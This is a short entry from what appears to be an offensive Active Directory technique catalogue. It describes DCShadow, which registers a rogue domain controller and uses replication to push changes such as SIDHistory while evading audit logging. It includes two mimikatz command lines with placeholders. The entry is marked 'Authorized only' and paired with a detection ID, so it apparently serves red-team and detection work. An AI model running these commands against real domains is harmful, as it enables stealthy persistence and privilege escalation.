---
id: dcshadow
title: DCShadow (register a rogue DC, push directory changes)
section: Active Directory — attack paths
phase: Defense Impairment
attack:
  tactic: TA0112
  techniques: [T1207]
platform: [windows]
source: hacktheplanet §"Active Directory — attack paths"
pair: dcshadow-4742
---

With DA (or equivalent write over the right objects), temporarily register your
host as a "domain controller" in the directory, then use replication to *push*
arbitrary changes — add SIDHistory, flip a primaryGroupID, plant a backdoor — that
arrive as legitimate DC-to-DC replication and dodge most change-audit logging.
mimikatz drives both halves (one elevated, one as the operator). Authorized only.

```sh
mimikatz # lsadump::dcshadow /object:{{user}} /attribute:SIDHistory /value:<attacker-sid>
mimikatz # lsadump::dcshadow /push
```
